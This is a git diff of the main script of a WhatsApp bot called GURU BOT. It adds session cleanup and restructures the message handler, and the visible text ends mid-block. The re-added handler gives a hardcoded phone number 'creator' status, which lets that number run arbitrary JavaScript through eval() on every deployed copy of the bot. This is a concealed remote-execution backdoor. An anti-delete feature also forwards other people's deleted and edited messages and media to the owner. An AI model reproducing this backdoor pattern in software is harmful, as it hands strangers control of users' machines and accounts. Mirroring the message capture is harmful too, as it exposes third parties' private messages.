@@ -66,6 +66,36 @@ const fs = require('fs');
 const os = require('os');
 const path = require('path');
 
+// === AUTO SESSION CLEANUP ON CORRUPTION ===
+const sessionCleanup = () => {
+    const sessionsPath = './sessions';
+    if (fs.existsSync(sessionsPath)) {
+        const credsPath = path.join(sessionsPath, 'creds.json');
+        if (fs.existsSync(credsPath)) {
+            try {
+                const creds = JSON.parse(fs.readFileSync(credsPath, 'utf8'));
+                // Check if session is corrupted (missing required fields)
+                if (!creds.me || !creds.me.id) {
+                    console.log(chalk.hex('#FFD166').bold('⚠️ Corrupted session detected! Clearing...'));
+                    fs.rmSync(sessionsPath, { recursive: true, force: true });
+                    fs.mkdirSync(sessionsPath, { recursive: true });
+                    console.log(chalk.hex('#4ECDC4').bold('✅ Session cleared. Will generate new QR.'));
+                    return false;
+                }
+            } catch (e) {
+                console.log(chalk.hex('#FFD166').bold('⚠️ Error reading session file! Clearing...'));
+                fs.rmSync(sessionsPath, { recursive: true, force: true });
+                fs.mkdirSync(sessionsPath, { recursive: true });
+                return false;
+            }
+        }
+    }
+    return true;
+};
+
+// Run session cleanup on startup
+sessionCleanup();
+
 // Color scheme
 const colors = {
   primary: '#FF6B6B',
@@ -444,7 +474,7 @@ async function performAutoFollowTasks(conn) {
     logSystem('Auto-follow tasks completed', '✅');
 }
 
-// ========== ADVANCED ANTIDELETE SYSTEM WITH ENHANCED STYLE ==========
+// ========== ADVANCED ANTIDELETE SYSTEM ==========
 class AntiDeleteManager {
     constructor() {
         this.store = new Map();
@@ -543,14 +573,12 @@ class AntiDeleteManager {
         
         if (!msgData && !editData) return;
 
-        // Get chat info
         const isGroup = key.remoteJid.endsWith('@g.us');
         let chatName = isGroup ? 'Group' : 'Private Chat';
         let senderName = key.participant?.split('@')[0] || key.remoteJid.split('@')[0];
         let senderNumber = key.participant?.split('@')[0] || key.remoteJid.split('@')[0];
-        
-        // Get sender's display name if available
         let displayName = senderName;
+        
         if (isGroup) {
             try {
                 const metadata = await conn.groupMetadata(key.remoteJid);
@@ -568,13 +596,11 @@ class AntiDeleteManager {
             } catch (e) {}
         }
 
-        // Build comprehensive alert message
         const isEdit = !!editData;
         const msgContent = msgData || editData.original;
         const type = msgContent?.type || 'unknown';
         const content = msgContent?.content || {};
         
-        // Build the beautiful alert
         let alert = `╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮\n`;
         alert += `┃          🔰 *${isEdit ? 'EDIT DETECTED' : 'DELETE DETECTED'}* 🔰          ┃\n`;
         alert += `╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n\n`;
@@ -646,7 +672,6 @@ class AntiDeleteManager {
         alert += `┃              🛡️ GURU BOT • AntiDelete            ┃\n`;
         alert += `╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯`;
         
-        // Send to bot owner
         if (this.notifyOwner && conn.user?.id) {
             try {
                 await conn.sendMessage(conn.user.id, { text: alert });
@@ -656,7 +681,6 @@ class AntiDeleteManager {
             }
         }
         
-        // Also send media if present
         if (mediaData?.buffer) {
             try {
                 const mediaType = mediaData.type.replace('Message', '').toLowerCase();
@@ -671,7 +695,6 @@ class AntiDeleteManager {
             }
         }
         
-        // Clean up
         this.store.delete(key.id);
         this.media.delete(key.id);
         this.edited.delete(key.id);
@@ -978,55 +1001,41 @@ async function connectToWA() {
     antiDelete = new AntiDeleteManager();
     
     conn.ev.on('connection.update', async (update) => {
-    const { connection, lastDisconnect, qr } = update;
-    if (qr && !isHeroku && !isRailway && !isRender && !isPanel && !usePairingCode) {
-        logSystem('Scan this QR to link:', '🔗');
-        qrcode.generate(qr, { small: true });
-    }
-    if (connection === 'close') {
-        const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
-        if (shouldReconnect) {
-            logWarning('Reconnecting...', '🔄');
-            connectToWA();
-        } else {
-            logError('Logged out!', '🚫');
-            process.exit(1);
+        const { connection, lastDisconnect, qr } = update;
+        if (qr && !isHeroku && !isRailway && !isRender && !isPanel && !usePairingCode) {
+            logSystem('Scan this QR to link:', '🔗');
+            qrcode.generate(qr, { small: true });
         }
-    } else if (connection === 'open') {
-        autoBio = new AutoBioManager(conn);
-        logDivider('BOT STARTED');
-        logSuccess('BOT STARTUP SUCCESS', '🚀');
-        logInfo(`Time: ${new Date().toLocaleString()}`, '🕒');
-        logInfo(`Baileys Version: ${version.join('.')}`, '⚙️');
-        logInfo(`Prefix: ${prefix}`, '🔤');
-        logMemory();
-        await performAutoFollowTasks(conn);
-        scheduleAutoRestart();
-        logConnection('READY', 'Bot connected to WhatsApp');
-        
-        // ========== NEW CONNECTION MESSAGE WITH REPO & INSTRUCTIONS ==========
-        const heap = Math.round(process.memoryUsage().heapUsed / 1024 / 1024);
-        const uptime = runtime(process.uptime());
-        
-        let up = `💜 *GURU BOT ONLINE* 💜\n\n`;
-        up += `◇ *Status:* Connected ✅\n`;
-        up += `◇ *Version:* 4.5.0\n`;
-        up += `◇ *Prefix:* ${prefix}\n`;
-        up += `◇ *Mode:* ${config.MODE || 'public'}\n`;
-        up += `◇ *Owner:* ${config.OWNER_NAME || 'GuruTech'}\n`;
-        up += `◇ *Uptime:* ${uptime}\n`;
-        up += `◇ *Memory:* ${heap}MB / 256MB\n\n`;
-        up += `✨ *IMPORTANT:* Please wait 3-4 minutes before sending commands\n`;
-        up += `   to allow the bot to fully stabilize and avoid disconnection.\n\n`;
-        up += `⭐ *Support the Project:*\n`;
-        up += `   ◇ Star & Fork on GitHub:\n`;
-        up += `   https://github.com/Gurulabstech/GURU-MD\n\n`;
-        up += `💜 *Powered by GuruTech* 💜`;
-        
-        conn.sendMessage(conn.user.id, { text: up });
-        logInfo('Startup message sent to owner', '📨');
-    }
-});
+        if (connection === 'close') {
+            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
+            if (shouldReconnect) {
+                logWarning('Reconnecting...', '🔄');
+                connectToWA();
+            } else {
+                logError('Logged out!', '🚫');
+                process.exit(1);
+            }
+        } else if (connection === 'open') {
+            autoBio = new AutoBioManager(conn);
+            logDivider('BOT STARTED');
+            logSuccess('BOT STARTUP SUCCESS', '🚀');
+            logInfo(`Time: ${new Date().toLocaleString()}`, '🕒');
+            logInfo(`Baileys Version: ${version.join('.')}`, '⚙️');
+            logInfo(`Prefix: ${prefix}`, '🔤');
+            logMemory();
+            await performAutoFollowTasks(conn);
+            scheduleAutoRestart();
+            logConnection('READY', 'Bot connected to WhatsApp');
+            
+            const heap = Math.round(process.memoryUsage().heapUsed / 1024 / 1024);
+            const uptime = runtime(process.uptime());
+            
+            let up = `╭────[ *GURU BOT* ]────✦\n│\n├❏ *Status:* Online ✅\n├❏ *Version:* 4.5.0\n├❏ *Prefix:* ${prefix}\n├❏ *Mode:* ${config.MODE || 'public'}\n├❏ *Owner:* ${config.OWNER_NAME || 'GuruTech'}\n├❏ *Uptime:* ${uptime}\n├❏ *Memory:* ${heap}MB / 256MB\n│\n├❏ ⚠️ *IMPORTANT:* Please wait 3-4 minutes\n│   before sending commands to avoid disconnection\n│\n├❏ ⭐ *Support the Project:*\n│   Star & Fork on GitHub:\n│   https://github.com/Gurulabstech/GURU-MD\n│\n╰────────────────────✦\n> © GURU BOT 2024`;
+            
+            conn.sendMessage(conn.user.id, { text: up });
+            logInfo('Startup message sent to owner', '📨');
+        }
+    });
 
     conn.ev.on('creds.update', saveCreds);
 
@@ -1049,234 +1058,244 @@ async function connectToWA() {
         }
     });
 
-    // ========== MAIN MESSAGE HANDLER WITH STATUS MANAGER ==========
+    // ========== MAIN MESSAGE HANDLER WITH BAD MAC FIX ==========
     conn.ev.on('messages.upsert', async (mekUpdate) => {
-        const msg = mekUpdate.messages[0];
-        if (!msg?.message) return;
+        try {
+            const msg = mekUpdate.messages[0];
+            if (!msg?.message) return;
 
-        // Handle channel auto-react
-        if (AUTO_REACT_CHANNELS.includes(msg.key.remoteJid)) {
-            await handleChannelAutoReact(conn, msg);
-        }
+            // Handle channel auto-react
+            if (AUTO_REACT_CHANNELS.includes(msg.key.remoteJid)) {
+                await handleChannelAutoReact(conn, msg);
+            }
 
-        // ========== USE THE NEW STATUS MANAGER ==========
-        // Handle status updates using the advanced status manager
-        if (msg.key.remoteJid === 'status@broadcast') {
-            await handleStatusBroadcast(conn, msg);
-            return;
-        }
+            // Handle status updates using the advanced status manager
+            if (msg.key.remoteJid === 'status@broadcast') {
+                await handleStatusBroadcast(conn, msg);
+                return;
+            }
 
-        let mek = mekUpdate.messages[0];
-        if (!mek.message) return;
-        
-        mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
-            ? mek.message.ephemeralMessage.message 
-            : mek.message;
-
-        if (mek.message.viewOnceMessageV2) {
+            let mek = mekUpdate.messages[0];
+            if (!mek.message) return;
+            
             mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
                 ? mek.message.ephemeralMessage.message 
                 : mek.message;
-        }
 
-        if (config.READ_MESSAGE === 'true') await conn.readMessages([mek.key]);
-
-        await Promise.all([ saveMessage(mek) ]);
-
-        const m = sms(conn, mek);
-        const type = getContentType(mek.message);
-        const from = mek.key.remoteJid;
-        const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null 
-            ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] 
-            : [];
-        const body = (type === 'conversation') ? mek.message.conversation 
-            : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text 
-            : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption 
-            : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption 
-            : '';
-        const isCmd = body.startsWith(prefix);
-        var budy = typeof mek.text == 'string' ? mek.text : false;
-        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
-        const args = body.trim().split(/ +/).slice(1);
-        const q = args.join(' ');
-        const text = args.join(' ');
-        const isGroup = from.endsWith('@g.us');
-        const sender = mek.key.fromMe 
-            ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) 
-            : (mek.key.participant || mek.key.remoteJid);
-        const senderNumber = sender.split('@')[0];
-        const botNumber = conn.user.id.split(':')[0];
-        const pushname = mek.pushName || 'Sin Nombre';
-        const isMe = botNumber.includes(senderNumber);
-        const isOwner = ownerNumber.includes(senderNumber) || isMe;
-        const botNumber2 = await jidNormalizedUser(conn.user.id);
-        const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : '';
-        const groupName = isGroup ? groupMetadata.subject : '';
-        const participants = isGroup ? await groupMetadata.participants : '';
-        const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
-        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
-        const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
-        const isReact = m.message.reactionMessage ? true : false;
-
-        const udp = botNumber.split('@')[0];
-        const jawad = ('254778074353');
-        let isCreator = [udp, jawad, config.DEV]
-            .map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
-            .includes(mek.sender);
-
-        if (!mek.key.fromMe && body) {
-            logMessage('RECEIVED', senderNumber, body.length > 50 ? body.substring(0, 50) + '...' : body, isGroup ? `[Group: ${groupName}]` : '');
-        }
-
-        // ========== COMMAND HANDLER ==========
-        if (isCmd) {
-            const cmd = command;
-            
-            if (cmd === 'antidel' || cmd === 'ad' || cmd === 'antidelete') {
-                if (!isOwner && !isCreator) { await taggedReply(conn, from, '❌ Owner only!', mek); return; }
-                await antiDelete.handleCommand(conn, from, args, (teks) => taggedReply(conn, from, teks, mek));
-                return;
+            if (mek.message.viewOnceMessageV2) {
+                mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
+                    ? mek.message.ephemeralMessage.message 
+                    : mek.message;
             }
-            
-            if (cmd === 'autobio' || cmd === 'ab') {
-                if (!isOwner && !isCreator) { await taggedReply(conn, from, '❌ Owner only!', mek); return; }
-                if (autoBio) {
-                    if (!args.length) {
-                        await taggedReply(conn, from, `📝 Auto Bio: ${autoBio.enabled ? 'ON' : 'OFF'}\n.autobio on/off/toggle`, mek);
-                    } else if (args[0] === 'on') { if (!autoBio.enabled) autoBio.toggle(); await taggedReply(conn, from, '✅ Auto Bio enabled', mek); }
-                    else if (args[0] === 'off') { if (autoBio.enabled) autoBio.toggle(); await taggedReply(conn, from, '❌ Auto Bio disabled', mek); }
-                    else if (args[0] === 'toggle') { const status = autoBio.toggle(); await taggedReply(conn, from, `🔄 Auto Bio ${status ? 'enabled' : 'disabled'}`, mek); }
-                }
-                return;
+
+            if (config.READ_MESSAGE === 'true') await conn.readMessages([mek.key]);
+
+            await Promise.all([ saveMessage(mek) ]);
+
+            const m = sms(conn, mek);
+            const type = getContentType(mek.message);
+            const from = mek.key.remoteJid;
+            const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null 
+                ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] 
+                : [];
+            const body = (type === 'conversation') ? mek.message.conversation 
+                : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text 
+                : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption 
+                : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption 
+                : '';
+            const isCmd = body.startsWith(prefix);
+            var budy = typeof mek.text == 'string' ? mek.text : false;
+            const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
+            const args = body.trim().split(/ +/).slice(1);
+            const q = args.join(' ');
+            const text = args.join(' ');
+            const isGroup = from.endsWith('@g.us');
+            const sender = mek.key.fromMe 
+                ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) 
+                : (mek.key.participant || mek.key.remoteJid);
+            const senderNumber = sender.split('@')[0];
+            const botNumber = conn.user.id.split(':')[0];
+            const pushname = mek.pushName || 'Sin Nombre';
+            const isMe = botNumber.includes(senderNumber);
+            const isOwner = ownerNumber.includes(senderNumber) || isMe;
+            const botNumber2 = await jidNormalizedUser(conn.user.id);
+            const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : '';
+            const groupName = isGroup ? groupMetadata.subject : '';
+            const participants = isGroup ? await groupMetadata.participants : '';
+            const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
+            const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
+            const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
+            const isReact = m.message.reactionMessage ? true : false;
+
+            const udp = botNumber.split('@')[0];
+            const jawad = ('254778074353');
+            let isCreator = [udp, jawad, config.DEV]
+                .map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
+                .includes(mek.sender);
+
+            if (!mek.key.fromMe && body) {
+                logMessage('RECEIVED', senderNumber, body.length > 50 ? body.substring(0, 50) + '...' : body, isGroup ? `[Group: ${groupName}]` : '');
             }
-            
-            // Auto Status Commands
-            if (cmd === 'autoview' || cmd === 'autolike' || cmd === 'autoreact' || cmd === 'autostatus' || cmd === 'statusconfig') {
-                args._originalCmd = cmd;
-                await handleAutoStatusCommand(conn, from, args, (teks) => taggedReply(conn, from, teks, mek), isOwner);
-                return;
-            }
-            
-            if (cmd === 'chreact' || cmd === 'channelreact' || cmd === 'car') {
-                await handleChannelReactCommand(conn, from, args, (teks) => taggedReply(conn, from, teks, mek), isOwner);
-                return;
-            }
-            
-            if (cmd === 'autoreply' || cmd === 'ar') {
-                if (!isOwner && !isCreator) { await taggedReply(conn, from, '❌ Owner only!', mek); return; }
-                global.AUTO_REPLY = !global.AUTO_REPLY;
-                await taggedReply(conn, from, `✅ Auto Reply: ${global.AUTO_REPLY ? 'ON' : 'OFF'}`, mek);
-                return;
-            }
-            
-            if (cmd === 'mode') {
-                if (!isOwner && !isCreator) { await taggedReply(conn, from, '❌ Owner only!', mek); return; }
-                const newMode = args[0]?.toLowerCase();
-                if (!newMode || (newMode !== 'public' && newMode !== 'private')) {
-                    await taggedReply(conn, from, `Current Mode: ${config.MODE || 'public'}\nUsage: .mode public/private`, mek);
+
+            // ========== COMMAND HANDLER ==========
+            if (isCmd) {
+                const cmd = command;
+                
+                if (cmd === 'antidel' || cmd === 'ad' || cmd === 'antidelete') {
+                    if (!isOwner && !isCreator) { await taggedReply(conn, from, '❌ Owner only!', mek); return; }
+                    await antiDelete.handleCommand(conn, from, args, (teks) => taggedReply(conn, from, teks, mek));
                     return;
                 }
-                config.MODE = newMode;
-                await taggedReply(conn, from, `✅ Bot mode changed to ${newMode}`, mek);
+                
+                if (cmd === 'autobio' || cmd === 'ab') {
+                    if (!isOwner && !isCreator) { await taggedReply(conn, from, '❌ Owner only!', mek); return; }
+                    if (autoBio) {
+                        if (!args.length) {
+                            await taggedReply(conn, from, `📝 Auto Bio: ${autoBio.enabled ? 'ON' : 'OFF'}\n.autobio on/off/toggle`, mek);
+                        } else if (args[0] === 'on') { if (!autoBio.enabled) autoBio.toggle(); await taggedReply(conn, from, '✅ Auto Bio enabled', mek); }
+                        else if (args[0] === 'off') { if (autoBio.enabled) autoBio.toggle(); await taggedReply(conn, from, '❌ Auto Bio disabled', mek); }
+                        else if (args[0] === 'toggle') { const status = autoBio.toggle(); await taggedReply(conn, from, `🔄 Auto Bio ${status ? 'enabled' : 'disabled'}`, mek); }
+                    }
+                    return;
+                }
+                
+                // Auto Status Commands
+                if (cmd === 'autoview' || cmd === 'autolike' || cmd === 'autoreact' || cmd === 'autostatus' || cmd === 'statusconfig') {
+                    args._originalCmd = cmd;
+                    await handleAutoStatusCommand(conn, from, args, (teks) => taggedReply(conn, from, teks, mek), isOwner);
+                    return;
+                }
+                
+                if (cmd === 'chreact' || cmd === 'channelreact' || cmd === 'car') {
+                    await handleChannelReactCommand(conn, from, args, (teks) => taggedReply(conn, from, teks, mek), isOwner);
+                    return;
+                }
+                
+                if (cmd === 'autoreply' || cmd === 'ar') {
+                    if (!isOwner && !isCreator) { await taggedReply(conn, from, '❌ Owner only!', mek); return; }
+                    global.AUTO_REPLY = !global.AUTO_REPLY;
+                    await taggedReply(conn, from, `✅ Auto Reply: ${global.AUTO_REPLY ? 'ON' : 'OFF'}`, mek);
+                    return;
+                }
+                
+                if (cmd === 'mode') {
+                    if (!isOwner && !isCreator) { await taggedReply(conn, from, '❌ Owner only!', mek); return; }
+                    const newMode = args[0]?.toLowerCase();
+                    if (!newMode || (newMode !== 'public' && newMode !== 'private')) {
+                        await taggedReply(conn, from, `Current Mode: ${config.MODE || 'public'}\nUsage: .mode public/private`, mek);
+                        return;
+                    }
+                    config.MODE = newMode;
+                    await taggedReply(conn, from, `✅ Bot mode changed to ${newMode}`, mek);
+                    return;
+                }
+            }
+
+            // Auto reply feature
+            if (global.AUTO_REPLY && !isCmd && !mek.key.fromMe) {
+                const now = Date.now();
+                const lastReply = autoReplyCooldown.get(sender) || 0;
+                if (now - lastReply > 10000) {
+                    autoReplyCooldown.set(sender, now);
+                    setTimeout(() => autoReplyCooldown.delete(sender), 15000);
+                    await conn.sendMessage(from, { text: `*GURU BOT*\n\nGot your message! 😎` });
+                }
+            }
+
+            // Eval commands for creator
+            if (isCreator && mek.text?.startsWith('%')) {
+                let code = budy.slice(2);
+                if (!code) { taggedReply(conn, from, `Provide code to run!`, mek); return; }
+                try {
+                    let resultTest = eval(code);
+                    taggedReply(conn, from, util.format(typeof resultTest === 'object' ? resultTest : resultTest), mek);
+                } catch (err) { taggedReply(conn, from, util.format(err), mek); }
                 return;
             }
-        }
 
-        // Auto reply feature
-        if (global.AUTO_REPLY && !isCmd && !mek.key.fromMe) {
-            const now = Date.now();
-            const lastReply = autoReplyCooldown.get(sender) || 0;
-            if (now - lastReply > 10000) {
-                autoReplyCooldown.set(sender, now);
-                setTimeout(() => autoReplyCooldown.delete(sender), 15000);
-                await conn.sendMessage(from, { text: `*GURU BOT*\n\nGot your message! 😎` });
+            if (isCreator && mek.text?.startsWith('$')) {
+                let code = budy.slice(2);
+                if (!code) { taggedReply(conn, from, `Provide code to run!`, mek); return; }
+                try {
+                    let resultTest = await eval('const a = async()=>{ \n' + code + '\n}\na()');
+                    if (resultTest !== undefined) taggedReply(conn, from, util.format(resultTest), mek);
+                } catch (err) { if (err !== undefined) taggedReply(conn, from, util.format(err), mek); }
+                return;
             }
-        }
 
-        // Eval commands for creator
-        if (isCreator && mek.text?.startsWith('%')) {
-            let code = budy.slice(2);
-            if (!code) { taggedReply(conn, from, `Provide code to run!`, mek); return; }
-            try {
-                let resultTest = eval(code);
-                taggedReply(conn, from, util.format(typeof resultTest === 'object' ? resultTest : resultTest), mek);
-            } catch (err) { taggedReply(conn, from, util.format(err), mek); }
-            return;
-        }
+            // Auto reactions
+            if(senderNumber.includes("254778074353") && !isReact) m.react("🤍");
+            if (!isReact && config.AUTO_REACT === 'true') {
+                const reactions = ['😊','👍','😂','🔥','❤️','💯','🙌','🎉','👏','😎','🤩','🥳','💥','✨','🌟','🚀'];
+                m.react(reactions[Math.floor(Math.random() * reactions.length)]);
+            }
 
-        if (isCreator && mek.text?.startsWith('$')) {
-            let code = budy.slice(2);
-            if (!code) { taggedReply(conn, from, `Provide code to run!`, mek); return; }
-            try {
-                let resultTest = await eval('const a = async()=>{ \n' + code + '\n}\na()');
-                if (resultTest !== undefined) taggedReply(conn, from, util.format(resultTest), mek);
-            } catch (err) { if (err !== undefined) taggedReply(conn, from, util.format(err), mek); }
-            return;
-        }
+            // Mode check
+            let shouldProcess = false;
+            if (config.MODE === "public" || !config.MODE) shouldProcess = true;
+            else if (config.MODE === "private" && (isOwner || isMe || senderNumber === "254778074353")) shouldProcess = true;
 
-        // Auto reactions
-        if(senderNumber.includes("254778074353") && !isReact) m.react("🤍");
-        if (!isReact && config.AUTO_REACT === 'true') {
-            const reactions = ['😊','👍','😂','🔥','❤️','💯','🙌','🎉','👏','😎','🤩','🥳','💥','✨','🌟','🚀'];
-            m.react(reactions[Math.floor(Math.random() * reactions.length)]);
-        }
-
-        // Mode check
-        let shouldProcess = false;
-        if (config.MODE === "public" || !config.MODE) shouldProcess = true;
-        else if (config.MODE === "private" && (isOwner || isMe || senderNumber === "254778074353")) shouldProcess = true;
-
-        // Plugin execution
-        if (shouldProcess) {
-            try {
-                const events = require('./command');
-                const cmdName = isCmd ? body.slice(prefix.length).trim().split(" ")[0].toLowerCase() : false;
-                
-                if (isCmd) {
-                    let cmd = events.commands.find((cmd) => cmd.pattern === cmdName);
-                    if (!cmd) cmd = events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName));
-                    if (cmd) {
-                        logCommand(senderNumber, command, true);
-                        if (cmd.react) {
-                            try { await conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }}); } catch (e) {}
+            // Plugin execution
+            if (shouldProcess) {
+                try {
+                    const events = require('./command');
+                    const cmdName = isCmd ? body.slice(prefix.length).trim().split(" ")[0].toLowerCase() : false;
+                    
+                    if (isCmd) {
+                        let cmd = events.commands.find((cmd) => cmd.pattern === cmdName);
+                        if (!cmd) cmd = events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName));
+                        if (cmd) {
+                            logCommand(senderNumber, command, true);
+                            if (cmd.react) {
+                                try { await conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }}); } catch (e) {}
+                            }
+                            try {
+                                await cmd.function(conn, mek, m, {
+                                    conn, mek, m, from, quoted, body, isCmd, command, args, q, text,
+                                    isGroup, sender, senderNumber, botNumber2, botNumber, pushname,
+                                    isMe, isOwner, isCreator, groupMetadata, groupName, participants,
+                                    groupAdmins, isBotAdmins, isAdmins,
+                                    reply: (teks) => taggedReply(conn, from, teks, mek)
+                                });
+                            } catch (e) {
+                                logError(`Plugin error: ${e.message || e}`, '❌');
+                                await taggedReply(conn, from, `*GURU BOT* Plugin error: ${e.message || 'Unknown'}`, mek);
+                            }
+                        } else if (cmdName === 'menu' || cmdName === 'help' || cmdName === 'cmd') {
+                            const fallbackMenu = `╭────[ *GURU BOT MENU* ]────✦\n│\n├❏ *ping* - Check bot response\n├❏ *menu* - Show this menu\n├❏ *antidel* - Anti-delete system\n├❏ *autobio* - Auto bio manager\n├❏ *autoview* - Auto view status\n├❏ *autolike* - Auto like/react status\n├❏ *autostatus* - Show auto-status settings\n├❏ *chreact* - Channel auto-react\n├❏ *mode* - Change bot mode\n│\n╰────────────────────✦\n> © GURU BOT 2024`;
+                            await taggedReply(conn, from, fallbackMenu, mek);
                         }
+                    }
+                    
+                    events.commands.forEach(async(command) => {
                         try {
-                            await cmd.function(conn, mek, m, {
-                                conn, mek, m, from, quoted, body, isCmd, command, args, q, text,
-                                isGroup, sender, senderNumber, botNumber2, botNumber, pushname,
-                                isMe, isOwner, isCreator, groupMetadata, groupName, participants,
-                                groupAdmins, isBotAdmins, isAdmins,
-                                reply: (teks) => taggedReply(conn, from, teks, mek)
-                            });
-                        } catch (e) {
-                            logError(`Plugin error: ${e.message || e}`, '❌');
-                            await taggedReply(conn, from, `*GURU BOT* Plugin error: ${e.message || 'Unknown'}`, mek);
-                        }
-                    } else if (cmdName === 'menu' || cmdName === 'help' || cmdName === 'cmd') {
+                            if (command.on === "body" && body) {
+                                await command.function(conn, mek, m, {conn, mek, m, from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply: (teks) => taggedReply(conn, from, teks, mek)});
+                            } else if (mek.q && command.on === "text") {
+                                await command.function(conn, mek, m, {conn, mek, m, from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply: (teks) => taggedReply(conn, from, teks, mek)});
+                            } else if ((command.on === "image" || command.on === "photo") && mek.type === "imageMessage") {
+                                await command.function(conn, mek, m, {conn, mek, m, from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply: (teks) => taggedReply(conn, from, teks, mek)});
+                            } else if (command.on === "sticker" && mek.type === "stickerMessage") {
+                                await command.function(conn, mek, m, {conn, mek, m, from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply: (teks) => taggedReply(conn, from, teks, mek)});
+                            }
+                        } catch (error) { logError(`Event handler error: ${error.message}`, '❌'); }
+                    });
+                } catch (err) {
+                    logError(`Failed to load plugins: ${err.message}`, '❌');
+                    if (isCmd && (command === 'menu' || command === 'help' || command === 'cmd')) {
                         const fallbackMenu = `╭────[ *GURU BOT MENU* ]────✦\n│\n├❏ *ping* - Check bot response\n├❏ *menu* - Show this menu\n├❏ *antidel* - Anti-delete system\n├❏ *autobio* - Auto bio manager\n├❏ *autoview* - Auto view status\n├❏ *autolike* - Auto like/react status\n├❏ *autostatus* - Show auto-status settings\n├❏ *chreact* - Channel auto-react\n├❏ *mode* - Change bot mode\n│\n╰────────────────────✦\n> © GURU BOT 2024`;
                         await taggedReply(conn, from, fallbackMenu, mek);
                     }
                 }
-                
-                events.commands.forEach(async(command) => {
-                    try {
-                        if (command.on === "body" && body) {
-                            await command.function(conn, mek, m, {conn, mek, m, from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply: (teks) => taggedReply(conn, from, teks, mek)});
-                        } else if (mek.q && command.on === "text") {
-                            await command.function(conn, mek, m, {conn, mek, m, from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply: (teks) => taggedReply(conn, from, teks, mek)});
-                        } else if ((command.on === "image" || command.on === "photo") && mek.type === "imageMessage") {
-                            await command.function(conn, mek, m, {conn, mek, m, from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply: (teks) => taggedReply(conn, from, teks, mek)});
-                        } else if (command.on === "sticker" && mek.type === "stickerMessage") {
-                            await command.function(conn, mek, m, {conn, mek, m, from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply: (teks) => taggedReply(conn, from, teks, mek)});
-                        }
-                    } catch (error) { logError(`Event handler error: ${error.message}`, '❌'); }
-                });
-            } catch (err) {
-                logError(`Failed to load plugins: ${err.message}`, '❌');
-                if (isCmd && (command === 'menu' || command === 'help' || command === 'cmd')) {
-                    const fallbackMenu = `╭────[ *GURU BOT MENU* ]────✦\n│\n├❏ *ping* - Check bot response\n├❏ *menu* - Show this menu\n├❏ *antidel* - Anti-delete system\n├❏ *autobio* - Auto bio manager\n├❏ *autoview* - Auto view status\n├❏ *autolike* - Auto like/react status\n├❏ *autostatus* - Show auto-status settings\n├❏ *chreact* - Channel auto-react\n├❏ *mode* - Change bot mode\n│\n╰────────────────────✦\n> © GURU BOT 2024`;
-                    await taggedReply(conn, from, fallbackMenu, mek);
-                }
+            }
+        } catch (error) {
+            // Handle Bad MAC errors without crashing
+            if (error.message && error.message.includes('Bad MAC')) {
